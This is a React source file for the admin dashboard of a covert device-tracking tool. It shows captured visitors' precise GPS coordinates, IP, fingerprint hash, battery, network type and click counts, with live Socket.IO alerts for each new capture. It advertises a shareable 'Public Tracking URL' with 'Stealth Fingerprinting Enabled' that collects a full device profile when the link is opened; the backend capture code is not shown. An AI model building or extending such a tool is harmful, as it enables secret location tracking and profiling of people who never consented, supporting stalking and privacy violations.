import React, { useState, useEffect } from 'react';
import { motion } from 'framer-motion';
import { MapPin, RefreshCw, ExternalLink, Calendar, Smartphone, Globe, User, Battery, Monitor, Signal, Fingerprint, Info, MousePointer, Activity, ChevronRight, Wifi } from 'lucide-react';
import { io } from 'socket.io-client';
import Card from '../components/common/Card';
import Button from '../components/common/Button';
import Table from '../components/common/Table';
import { api, baseURL } from '../services/api/client';
import { toast } from 'react-hot-toast';
import { useNavigate } from 'react-router-dom';

const PublicLocationsPage = () => {
  const navigate = useNavigate();
  const [locations, setLocations] = useState([]);
  const [isLoading, setIsLoading] = useState(true);
  const [isRefreshing, setIsRefreshing] = useState(false);
  const [filterVisitorId, setFilterVisitorId] = useState(null);
  const [isConnected, setIsConnected] = useState(false);
  const [liveUpdates, setLiveUpdates] = useState(0);

  // The capture page is on the backend. BaseURL usually has /api at the end.
  const publicCaptureUrl = baseURL.replace('/api', '') + '/public/capture';

  const fetchLocations = async () => {
    setIsRefreshing(true);
    try {
      const response = await api.get('/public/all-locations');
      if (response.data.success) {
        setLocations(response.data.data);
      } else {
        toast.error('Failed to fetch locations');
      }
    } catch (error) {
      console.error('Error fetching locations:', error);
      toast.error('Error connecting to server');
    } finally {
      setIsLoading(false);
      setIsRefreshing(false);
    }
  };

  useEffect(() => {
    fetchLocations();

    // Socket.IO Connection for live updates
    const socketUrl = baseURL.replace('/api', '');
    const token = localStorage.getItem('token');
    
    const socket = io(socketUrl, {
      auth: { token },
      transports: ['websocket', 'polling']
    });

    socket.on('connect', () => {
      console.log('Socket connected:', socket.id);
      setIsConnected(true);
      // Join admin room
      socket.emit('admin:join');
    });

    socket.on('disconnect', () => {
      console.log('Socket disconnected');
      setIsConnected(false);
    });

    socket.on('admin:joined', (data) => {
      if (data.success) {
        console.log('Joined admin room');
        toast.success('Live tracking enabled');
      }
    });

    // Listen for new location captures
    socket.on('location:captured', (data) => {
      console.log('New location captured:', data);
      setLiveUpdates(prev => prev + 1);
      
      // Add new location to the list (at the top)
      setLocations(prevLocations => {
        const newLocation = {
          _id: Date.now().toString(),
          visitorId: data.visitorId,
          ip: data.ip,
          location: data.location,
          accuracy: data.accuracy,
          method: data.method,
          capturedAt: data.createdAt,
          screenResolution: data.deviceInfo?.screenResolution,
          language: data.deviceInfo?.language,
          timezone: data.deviceInfo?.timezone,
          isLive: true  // Mark as live update
        };
        return [newLocation, ...prevLocations];
      });

      // Show toast notification
      toast.success(`New device tracked: ${data.visitorId?.substring(0, 8)}...`, {
        icon: '📍',
        duration: 3000
      });
    });

    return () => {
      socket.disconnect();
    };
  }, []);

  const filteredLocations = filterVisitorId 
    ? locations.filter(l => l.visitorId === filterVisitorId)
    : locations;

  const columns = [
    {
      header: 'User / Visitor',
      render: (row) => (
        <div className="flex flex-col group">
          <div className="flex items-center space-x-2">
            <User className="w-4 h-4 text-gray-400" />
            <span 
              className="text-sm font-mono cursor-pointer text-blue-600 font-bold hover:underline flex items-center"
              onClick={() => navigate(`/public-locations/${row.visitorId || row.ip}`)}
              title="Click to view full user profile"
            >
              {row.visitorId ? row.visitorId.substring(0, 10) + '...' : `IP: ${row.ip?.substring(0, 10)}...`}
              <ChevronRight className="w-3 h-3 ml-1 opacity-0 group-hover:opacity-100 transition-opacity" />
            </span>
          </div>
          <div className="flex items-center mt-1 space-x-1">
            <Fingerprint className="w-3 h-3 text-socius-red" />
            <span className="text-[10px] font-mono text-gray-400">ID: {row.fingerprintHash || 'N/A'}</span>
          </div>
        </div>
      ),
    },
    {
      header: 'Captured At',
      render: (row) => (
        <div className="flex flex-col">
          <div className="flex items-center gap-2">
            <span className="text-sm text-gray-900 dark:text-white">
              {new Date(row.capturedAt).toLocaleString()}
            </span>
            {row.isLive && (
              <span className="px-1.5 py-0.5 bg-green-100 text-green-700 text-[10px] font-bold rounded animate-pulse">
                NEW
              </span>
            )}
          </div>
          <div className="flex items-center mt-1 space-x-2">
            <span className={`text-[10px] px-1.5 py-0.5 rounded-full font-bold uppercase ${row.method === 'geolocation' ? 'bg-green-100 text-green-700' : 'bg-blue-100 text-blue-700'}`}>
              {row.method || 'GPS'}
            </span>
            {row.behavioralData?.totalClicks > 0 && (
              <span className="text-[10px] bg-purple-100 text-purple-700 px-1.5 py-0.5 rounded-full font-bold">
                {row.behavioralData.totalClicks} CLICKS
              </span>
            )}
          </div>
        </div>
      ),
    },
    {
      header: 'Location',
      render: (row) => (
        <div className="flex flex-col space-y-1">
          <div className="flex items-center space-x-2">
            <MapPin className="w-4 h-4 text-socius-red" />
            <span className="text-sm font-mono bg-gray-100 dark:bg-gray-700 px-2 py-1 rounded">
              {row.location.coordinates[1].toFixed(6)}, {row.location.coordinates[0].toFixed(6)}
            </span>
            <a
              href={`https://www.google.com/maps?q=${row.location.coordinates[1]},${row.location.coordinates[0]}`}
              target="_blank"
              rel="noopener noreferrer"
              className="text-blue-500 hover:text-blue-700"
              title="View on Google Maps"
            >
              <ExternalLink className="w-4 h-4" />
            </a>
          </div>
          {row.accuracy && (
            <div className="flex items-center space-x-2">
              <div className={`h-2 w-2 rounded-full ${row.accuracy < 50 ? 'bg-green-500' : row.accuracy < 500 ? 'bg-yellow-500' : 'bg-red-500'}`}></div>
              <span className="text-xs text-gray-500">
                Acc: ±{Math.round(row.accuracy)}m 
              </span>
            </div>
          )}
        </div>
      ),
    },
    {
      header: 'Device Summary',
      render: (row) => (
        <div className="grid grid-cols-2 gap-x-2 gap-y-1 text-[11px] text-gray-600 dark:text-gray-400">
          <div className="flex items-center">
            <Monitor className="w-3 h-3 mr-1" />
            <span>{row.screenResolution || 'N/A'}</span>
          </div>
          <div className="flex items-center">
            <Battery className="w-3 h-3 mr-1" />
            <span>{row.batteryLevel ? Math.round(row.batteryLevel) + '%' : 'N/A'}</span>
          </div>
          <div className="flex items-center">
            <Signal className="w-3 h-3 mr-1" />
            <span className="truncate">{row.networkType || 'N/A'}</span>
          </div>
          <div className="flex items-center cursor-pointer text-blue-500" onClick={() => navigate(`/public-locations/${row.visitorId}`)}>
            <Info className="w-3 h-3 mr-1" />
            <span>Profile</span>
          </div>
        </div>
      ),
    },
  ];

  return (
    <div className="relative">
      <div className="space-y-6 p-6">
        <div className="flex justify-between items-center">
          <div>
            <div className="flex items-center gap-3">
              <h1 className="text-2xl font-bold text-gray-900 dark:text-white">Advanced Device Tracking</h1>
              {isConnected && (
                <span className="flex items-center gap-1 px-2 py-1 bg-green-100 text-green-700 text-xs font-bold rounded-full animate-pulse">
                  <Wifi className="w-3 h-3" />
                  LIVE
                  {liveUpdates > 0 && (
                    <span className="ml-1 bg-green-600 text-white px-1.5 rounded-full text-[10px]">
                      {liveUpdates}
                    </span>
                  )}
                </span>
              )}
            </div>
            <p className="text-gray-500 dark:text-gray-400">Deep fingerprinting, behavioral analysis, and network forensics</p>
          </div>
          <div className="flex space-x-3">
            {filterVisitorId && (
              <Button
                variant="secondary"
                onClick={() => setFilterVisitorId(null)}
                className="text-socius-red border-socius-red/30"
              >
                Clear Filter
              </Button>
            )}
            <Button
              variant="secondary"
              onClick={fetchLocations}
              disabled={isRefreshing}
            >
              <RefreshCw className={`w-4 h-4 mr-2 ${isRefreshing ? 'animate-spin' : ''}`} />
              Refresh
            </Button>
          </div>
        </div>

        <Card className="p-4 bg-blue-50 dark:bg-blue-900/20 border-blue-200 dark:border-blue-800">
          <div className="flex flex-col md:flex-row md:items-center justify-between space-y-4 md:space-y-0">
            <div>
              <h3 className="text-sm font-semibold text-blue-800 dark:text-blue-300">Public Tracking URL (Stealth Fingerprinting Enabled)</h3>
              <p className="text-xs text-blue-600 dark:text-blue-400 mt-1">
                Captures full device profile and behavioral data on load.
              </p>
            </div>
            <div className="flex items-center space-x-2">
              <input
                readOnly
                value={publicCaptureUrl}
                className="bg-white dark:bg-gray-800 border border-blue-300 dark:border-blue-700 rounded px-3 py-2 text-sm w-full md:w-80 font-mono"
              />
              <Button
                variant="primary"
                size="sm"
                onClick={() => {
                  if (navigator.clipboard && navigator.clipboard.writeText) {
                    navigator.clipboard.writeText(publicCaptureUrl);
                    toast.success('URL copied to clipboard');
                  } else {
                    const textArea = document.createElement("textarea");
                    textArea.value = publicCaptureUrl;
                    document.body.appendChild(textArea);
                    textArea.select();
                    document.execCommand('copy');
                    document.body.removeChild(textArea);
                    toast.success('URL copied');
                  }
                }}
              >
                Copy
              </Button>
            </div>
          </div>
        </Card>

        <Card>
          <div className="p-4 border-b border-gray-100 dark:border-gray-800 flex justify-between items-center">
            <h2 className="text-lg font-semibold text-gray-900 dark:text-white">
              {filterVisitorId ? `History for Visitor: ${filterVisitorId.substring(0, 15)}...` : 'Tracked Devices'}
            </h2>
            <span className="text-sm text-gray-500">
              Total entries: {filteredLocations.length}
            </span>
          </div>
          <Table
            columns={columns}
            data={filteredLocations}
            isLoading={isLoading}
            emptyMessage="No devices tracked yet."
          />
        </Card>
      </div>
    </div>
  );
};

export default PublicLocationsPage;
